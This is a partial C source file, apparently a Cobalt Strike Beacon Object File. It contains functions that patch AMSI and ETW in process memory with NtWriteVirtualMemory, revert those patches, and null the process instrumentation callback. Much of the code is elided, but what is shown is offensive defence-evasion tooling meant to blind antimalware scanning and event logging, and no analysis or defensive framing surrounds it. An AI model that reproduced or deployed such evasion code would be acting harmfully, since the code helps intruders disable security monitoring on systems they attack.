...
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$strncmp (char*, char*, size_t);
...
void patchitAMSI(){
    ...
    if (!patched)
    {
        ...
        status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);
        ...
        status = NtWriteVirtualMemory(NtCurrentProcess(), pAMSIaddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
        if(status != NT_SUCCESS)
        {
...
void patchitETW(){
    ...
    if (!patched)
    {
        ...
        status = NtWriteVirtualMemory(NtCurrentProcess(), pETWaddress, (PVOID)etwPatch, sizeof(etwPatch), NULL);
...
void revertAMSI(){
    ...
    if(loadedAMSI())
    {
        ...
        if (patched)
        {
            ...
            status = NtWriteVirtualMemory(NtCurrentProcess(), pAMSIaddress, (PVOID)cleanAMSI, sizeof(cleanAMSI), NULL);
...
void revertETW(){
    ...
    if (patched)
    {
        ...
        status = NtWriteVirtualMemory(NtCurrentProcess(), pETWaddress, (PVOID)cleanETW, sizeof(cleanETW), NULL);
...
void go(char * args, int len) {
    ...
    process_information.Callback = NULL;
    
    NTSTATUS status = NtSetInformationProcess(NtCurrentProcess(), ProcessInstrumentationCallback, &process_information, sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));
    
    if (status != NT_SUCCESS)
    {
    	BeaconPrintf(CALLBACK_ERROR , "Failed to NULL InstrumentationCallback.\n");
    }
